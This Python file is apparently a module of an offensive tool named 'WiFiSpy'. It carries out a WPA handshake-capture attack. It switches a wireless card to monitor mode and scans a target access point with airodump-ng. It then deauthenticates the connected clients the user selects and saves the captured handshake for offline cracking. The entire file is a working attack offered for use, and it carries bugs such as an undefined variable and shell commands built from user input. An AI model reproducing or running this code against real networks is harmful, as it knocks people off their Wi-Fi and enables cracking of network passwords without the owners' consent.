#!/usr/bin/env python3
from datetime import datetime
from scapy.all import srp,Ether,ARP,conf
import os
import socket
import sys
import random
import time
from multiprocessing import Process
import subprocess
import re

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[32m'
   LIGHTGREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   ORANGE = '\033[33m'
   END = '\033[0m'

def ERROR_print(msg):
    print(color.END+"["+color.RED+"x"+color.END+"]"+color.RED+" "+msg+color.CYAN)

def WARNING_print(msg):
    print(color.END+"["+color.ORANGE+"WARNING"+color.END+"]"+color.ORANGE+" "+msg+color.CYAN)

def SUCCESS_print(msg):
    print(color.END+"["+color.LIGHTGREEN+"+"+color.END+"]"+color.LIGHTGREEN+" "+msg+color.CYAN)

def INFO_print(msg):
    print(color.END+"["+color.YELLOW+"INFO"+color.END+"]"+color.YELLOW+" "+msg+color.CYAN)

def OVER_print(msg):
    sys.stdout.write("\033[F") #back to previous line
    sys.stdout.write("\033[K") #clear line
    print(msg)

def MEMORY_CLEANUP(INTERFACE, BSSID, HANDSHAKE_CAPTURED, deauther, hs_checker, hs_sniffer):
    print("[*] Cleaning up memory ... ")
    deauther.terminate()
    hs_checker.terminate()
    hs_sniffer.terminate()
    out = subprocess.Popen(["ps", "-ef"], encoding='utf8',         
           stdout=subprocess.PIPE, 
           stderr=subprocess.STDOUT)
    stdout,stderr = out.communicate()
    stdout = stdout.splitlines()
    for process_list in stdout:
       if '-title "Client Deauther - WiFiSpy Deauther V.1"' in process_list:
           CLEANED = process_list.split()
           try:
               os.kill(int(CLEANED[1]))
           except:
               pass
               print(WARNING_print("Could not kill one of the xterm windows 'PID: {0}' ...".format(str(CLEANED[1])))
               print(color.END)
       if '-title "Handshake Checker - WiFiSpy V.1"' in process_list:
           CLEANED = process_list.split()
           try:
               os.kill(int(CLEANED[1]))
           except:
               pass
               print(WARNING_print("Could not kill one of the xterm windows 'PID: {0}' ...".format(str(CLEANED[1]))))
               print(color.END)
       if '-title "Access Point Sniffer - WiFiSpy V.1"' in process_list:
           CLEANED = process_list.split()
           try:
               os.kill(int(CLEANED[1]))
           except:
               pass
               print(WARNING_print("Could not kill one of the xterm windows 'PID: {0}' ...".format(str(CLEANED[1]))))
               print(color.END)
    if HANDSHAKE_CAPTURED == True:
        os.system("mv {0}_CAPTURE-01.cap {1}_handshake.cap".format(BSSID, BSSID))
        os.system("mv {0}_handshake.cap /root/Desktop/".format(BSSID, BSSID))
        os.system("rm {0}_CAPTURE-01.* && rm HANDSHAKE_CAPTURED.SUCCESS".format(BSSID))
    monitor_quest = input("[?] Would you like to stop monitor mode? [Y/N]: ".format(INTERFACE))
            
    if monitor_quest == "Y" or monitor_quest == "y":
       print("[*] Yes? Ok stopping monitor mode for you ...")
       NEW_INTERFACE = INTERFACE.replace("mon", "")
       monitor_quest = input(color.END+"[?] Is your normal adapter '{0}'? [Y/N]: ".format(NEW_INTERFACE))
       if monitor_quest == "Y" or monitor_quest == "y":
          os.system("airmon-ng stop {0} >/dev/null 2>&1 &".format(INTERFACE))
          os.system("service network-manager start >/dev/null 2>&1 &")
    print("\n[+] Bye-bye, thanks for using WiFiSpy!\n")
    exit()

def DEAUTHER_STARTER(INTERFACE, TARGET_BSSID, CHANNEL, CLIENTS2DEAUTH, DEAUTHER_TOOL, TARGET_CMD):
    FIRST_RUN = True
    TARGET_CMD = ""
    if len(CLIENTS2DEAUTH) > 1:
        for CLIENT in CLIENTS2DEAUTH:
            if FIRST_RUN == True:
                TARGET_CMD = CLIENT
                FIRST_RUN = False
            else:
                TARGET_CMD += ","+CLIENT
    else:
         TARGET_CMD = CLIENTS2DEAUTH[0]
    os.system("cd ../ && cd wpa_capture && python3 client_deauther.py -i {0} -b {1} -c {2} -t {3} -d {4}".format(INTERFACE, TARGET_BSSID, CHANNEL, TARGET_CMD, DEAUTHER_TOOL))

def HANDSHAKE_CHECKER_STARTER(HS_CHECKER_TOOL, BSSID):
    os.system('cd ../ && cd wpa_capture && xterm -title "Handshake Checker - WiFiSpy V.1" -geometry 120x20+1000+525 -e "python3 handshaker_checker.py -t {0} -b {1}"'.format(HS_CHECKER_TOOL, BSSID))

def HANDSHAKE_SNIFFER_STARTER(INTERFACE, TARGET_BSSID, CHANNEL):
    os.system('cd ../ && cd wpa_capture && xterm -title "Access Point Sniffer - WiFiSpy V.1" -geometry 120x30+1000+50 -e "python3 ap_sniffer.py -i {0} -b {1} -c {2}"'.format(INTERFACE, TARGET_BSSID, CHANNEL))

def HANDSHAKE_START_ATTACK(INTERFACE, TARGET_BSSID, CHANNEL, HANDSHAKE_CAPTURED):
    DEAUTHER_TOOL = "none"
    HS_CHECKER_TOOL = "none"
    print("[*] Starting Handshake capture!")
    print("[!] Press CTRL+C to stop the scan when ready, we will take care of the rest!!")
    CONTINUE = input("[*] Press any key to start an Airodump-ng scan...\n")
    try:
        os.system("cd ../ && cd wpa_capture && rm airodump_scan.txt >/dev/null 2>&1 &")
    except:
        pass
        
    p = subprocess.Popen("airodump-ng {0} --bssid {1} -c {2}".format(INTERFACE, TARGET_BSSID, CHANNEL), encoding='utf8', shell=True, stderr=subprocess.PIPE)  
    output = ""  
    while True:
        try:
            out = p.stderr.read(1)
            if out == '' and p.poll() != None:
                break
            if out != '':
                output += out
                sys.stdout.write(out)
                sys.stdout.flush()
        except KeyboardInterrupt:
            break
    os.system("clear")
    LOAD_SECS = 6
    LOAD_CHAR = "."
    while LOAD_SECS > 0:
        os.system("clear")
        LOAD_SECS = LOAD_SECS - 1
        if LOAD_CHAR == "...":
            LOAD_CHAR = "."
        else:
            LOAD_CHAR += "."
        print("[*] Scan is done! Gathering info from results "+LOAD_CHAR)
        time.sleep(0.50)
    X = '([a-fA-F0-9]{2}[:]?){6}' # same regex as above
    c = re.compile(X).finditer(output)
    if c:
       for y in c:
           if not output[y.start(): y.end()] in CLIENTS and output[y.start(): y.end()] != TARGET_BSSID:
              CLIENTS.append(output[y.start(): y.end()])
    else:
        CLIENTS.append("No client(s) found! Please wait or try another WiFi!")
    FIRST_RUN = True
    CLIENT_NUMBER = 0
    os.system("clear")
    print("[*] All clients found: \n")
    print("0 / All = Every clients")
    for CLIENT in CLIENTS:
        if FIRST_RUN == True:
            CLIENT_NUMBER = 0
            CLIENT_NUMBER = CLIENT_NUMBER + 1
            FIRST_RUN = False
        else:
            CLIENT_NUMBER = CLIENT_NUMBER + 1
        print("{0}. {1}".format(str(CLIENT_NUMBER), CLIENT))
    a = input("\n[?] Select client to Deauth: ") 
    if "," in a:
        a = a.replace(",", " ")
        a = a.split()
        for A in a:
            a = CLIENTS[int(A)-1]
            CLIENTS2DEAUTH.append(str(a))
    elif a == "all" or a == "All" or a == "0":
        for CLIENT in CLIENTS:
            CLIENTS2DEAUTH.append(CLIENT)
    else:
        a = CLIENTS[int(a)-1]
        CLIENTS2DEAUTH.append(str(a))
    print("[+] Your Selected Station : \n")
    for CLIENT in CLIENTS2DEAUTH:
        print(CLIENT)
    print("\n[*] Avalaible Deauth tools:\n")
    print("  1. Aireplay-ng - Not avalaible, Coming in V.2.0!")
    print("  2. WiFiSpy-Deauther (Recommended / Faster Deauther)")
    TOOL2USE = input("\n[?] Choose your deauther tool: ")  
    if TOOL2USE == "1":
        DEAUTHER_TOOL = "wifispy"
    else:
        DEAUTHER_TOOL = "wifispy"   
       
    print("\n[*] Avalaible Handshake Checker tools:\n")
    print("  1. Aircrack-ng (Recommended)")
    print("  2. Pyrit (Not trustable)")
    TOOL2USE = input("\n[?] Choose your deauther tool: ")
    if TOOL2USE == "1":
        HS_CHECKER_TOOL = "aircrack-ng"
    else:
        HS_CHECKER_TOOL = "pyrit"
    
    os.system("clear")
    print("[*] Creating deauther.thread ...")
    deauther = Process(target=DEAUTHER_STARTER, args=(INTERFACE, TARGET_BSSID, CHANNEL, CLIENTS2DEAUTH, DEAUTHER_TOOL, TARGET_CMD))
    print("[*] Starting deauther.thread ...")
    deauther.start()
    print("[*] Creating handshake_checker.thread ...")
    hs_checker = Process(target=HANDSHAKE_CHECKER_STARTER, args=(HS_CHECKER_TOOL,TARGET_BSSID,))
    print("[*] Starting handshake_checker.thread ...")
    hs_checker.start()
    print("[*] Creating handshake_sniffer.thread ...")
    hs_sniffer = Process(target=HANDSHAKE_SNIFFER_STARTER, args=(INTERFACE, TARGET_BSSID, CHANNEL,))
    print("[*] Starting handshake_sniffer.thread ...")
    hs_sniffer.start()
    os.chdir("..")
    os.chdir("wpa_capture/tmp")
    
    print("[*] Handshake capturing has started, please wait!")
    print("[*] Press CTRL+C to stop the capturing!")
        
    print(".")
    
    while HANDSHAKE_CAPTURED == False:
        try:
            try:
                if os.path.isfile("HANDSHAKE_CAPTURED.SUCCESS"):
                    HANDSHAKE_CAPTURED = True
                    SUCCESS_print("Handshake captured!!!")
                    print(color.END)
                    print("[*] Please wait 5 seconds for the other threads to close ...")
                    time.sleep(5)
                    print("[*] Handshake file moved to => /root/Desktop/{0}_handshake.cap".format(BSSID))
                    MEMORY_CLEANUP(INTERFACE, BSSID, HANDSHAKE_CAPTURED, deauther, hs_checker, hs_sniffer)
                    break
            except:
                MEMORY_CLEANUP(INTERFACE, TARGET_BSSID, HANDSHAKE_CAPTURED, deauther, hs_checker, hs_sniffer) 
                pass          
        except KeyboardInterrupt:
            MEMORY_CLEANUP(INTERFACE, TARGET_BSSID, HANDSHAKE_CAPTURED, deauther, hs_checker, hs_sniffer)    
            pass
            break

    exit()    
    
    
INTERFACE = "Unset"
TARGET_BSSID = "Unset"
CHANNEL = "0"
CLIENTS = []
CLIENTS2DEAUTH = []
TARGET_CMD = ""
RUN_FIRST = True
HANDSHAKE_CAPTURED = False
    
def MAIN(INTERFACE, TARGET_BSSID, CHANNEL, HANDSHAKE_CAPTURED):
    while True:
        try:
            cmd_term = input(color.UNDERLINE+color.CYAN+"WiFiSpy"+color.END+"::"+color.UNDERLINE+color.CYAN+"root"+color.END+" ["+color.CYAN+color.UNDERLINE+"handshake_capture"+color.END+"] +> ")
            
            if cmd_term == "?" or cmd_term == "help":
                print(r"""
* Description *
    Detects client on the BSSID and kicks client that are selected by the user!
    Also have 3 background threads to capture and automaticly detect captured handshake(s).
    
* WiFiSpy Commands *
    ? - help             <*>    this menu
    back                 <*>    back to main menu
    credits              <*>    shows WiFiSpy credits
    version              <*>    displays exact version
    clear                <*>    clear screen

* Handshake-Capture Attack Commands *
    options              <*>    show current configurations / options
    set <option> <value> <*>    set options to the given value
    start                <*>    start Handshake-Capture attack
    show_info <options>  <*>    show description of a configuration / options
            """)

            if cmd_term == "back":
                exit()
             
            if cmd_term == "credits":
                print("Credits: ")
                print("Main Developer: Ghosty / DeaDHackS Team ")
                print("Who Coded This Module?: Ghosty / DeaDHackS Team ")
                print("With?: No one ")
             
            if cmd_term == "version":
                print("1.0 - First version ever made!")
             
            if cmd_term == "clear":
                if "nt" in os.name:
                    os.system("cls")
                else:
                    os.system("clear") 
                    
            if cmd_term == "options":
                print("""

OPTION        REQUIRED  VALUE
============= ========= ============
INTERFACE     Yes       {0}
TARGET_ BSSID Yes       {1}
CHANNEL       Yes       {2}

""".format(INTERFACE, TARGET_BSSID, CHANNEL))

            if "set" in cmd_term:
                CLEANED = cmd_term.replace("set ", "")
                ARGS = CLEANED.split()

                try:
                    if not ARGS[0]:
                        CHECK_ARG = "check"
                except:
                    pass
                    ERROR_print("Please give an option!")
                    MAIN(INTERFACE, TARGET_BSSID, CHANNEL, HANDSHAKE_CAPTURED)

                try:
                    if not ARGS[1]:
                        CHECK_ARG = "check"
                except:
                    pass
                    ERROR_print("Please give an value!")
                    MAIN(INTERFACE, TARGET_BSSID, CHANNEL, HANDSHAKE_CAPTURED)

                    
                if ARGS[0] == "INTERFACE":
                    INTERFACE = ARGS[1]
                    print("INTERFACE => {0}".format(INTERFACE))
                    
                elif ARGS[0] == "TARGET_BSSID":
                    print("[+] TIP: You can add more tham 1 target by doing so: set TARGET FF:FF:FF:FF:FF:FF,AA:AA:AA:AA:AA:AA")
                    TARGET_BSSID = ARGS[1]
                    print("TARGET_BSSID => {0}".format(TARGET_BSSID))
               
                elif ARGS[0] == "CHANNEL":
                    CHANNEL = ARGS[1]
                    print("CHANNEL => {0}".format(CHANNEL))
                
                else:
                    ERROR_print("'{0}' is not a valid option!".format(ARGS[0]))

            if cmd_term == "start":
                A = input("[?] Is your interface ({0}) already in monitor mode? [Y/N]: ".format(INTERFACE))
                if A == "N" or A == "n":
                    print("[*] No? Ok starting monitor mode for you ...")
                    os.system("airmon-ng start {0} >/dev/null 2>&1 &".format(INTERFACE))
                    print("[*] Killing error-causing proccess ...")
                    os.system("airmon-ng check kill >/dev/null 2>&1 &")
                    print("[*] Done!")
                    INFO_print("You can do 'ifconfig' in a terminal, to see all your adapters!")
                    monitor_quest = input(color.END+"[?] Is your new adapter '{0}mon'? [Y/N]: ".format(INTERFACE))
                    if monitor_quest == "Y" or monitor_quest == "y":
                        INTERFACE = INTERFACE+"mon"
                        print("[+] Ok good, starting module ...")
                    else:
                        monitor_quest = input("[?] Oh? Really? Please specifiy your new adapter: ")
                        INTERFACE = monitor_quest
                        
                HANDSHAKE_START_ATTACK(INTERFACE, TARGET_BSSID, CHANNEL, HANDSHAKE_CAPTURED)      

            if "show_info" in cmd_term:  
                CLEANED = cmd_term.replace("show_info ", "")
                ARGS = CLEANED.split()
                 
                try:
                    if not ARGS[0]:
                        CHECK_ARG = "check"
                except:
                    pass
                    ERROR_print("Please give an option!")
                    MAIN(INTERFACE, TARGET_BSSID, CHANNEL, HANDSHAKE_CAPTURED)
               
                if ARGS[0] == "INTERFACE":
                    print("The interface to use, example: do ifconfig (on linux) to see all your adapters, by default its something like wlan0 or wlan1.")

                else:
                    ERROR_print("'{0}' is not a valid option!".format(ARGS[0]))

        except KeyboardInterrupt:
            ERROR_print("\nWiFiSpy is now quitting, bye-bye ...")
            exit()
MAIN(INTERFACE, TARGET_BSSID, CHANNEL, HANDSHAKE_CAPTURED)

